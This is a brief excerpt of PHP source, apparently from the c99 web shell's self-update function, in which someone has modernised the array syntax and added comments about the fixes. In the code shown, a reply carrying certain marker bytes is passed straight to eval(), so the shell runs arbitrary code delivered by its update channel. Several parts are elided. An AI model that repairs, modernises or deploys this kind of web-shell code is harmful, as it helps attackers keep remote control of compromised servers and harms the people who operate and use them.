...
if (!function_exists("c99sh_getupdate")) {
    function c99sh_getupdate($update = true) {
        ...
        if (!$data) {
            ...
            $data = ltrim($data);
            $string = substr($data, 3, ord($data[2])); // Fixed from $data{2}
            if ($data[0] == "\x99" and $data[1] == "\x01") { // Fixed from $data{0} and $data{1}
                return "Error: " . $string;
                return false; // Note: This return is unreachable; consider removing
            }
            if ($data[0] == "\x99" and $data[1] == "\x02") { // Fixed from $data{0} and $data{1}
                return "You are using latest version!";
            }
            if ($data[0] == "\x99" and $data[1] == "\x03") { // Fixed from $data{0} and $data{1}
            ...
            } elseif ($data[0] == "\x99" and $data[1] == "\x04") { // Fixed from $data{0} and $data{1}
                eval($string);
                return 1;
            } else {
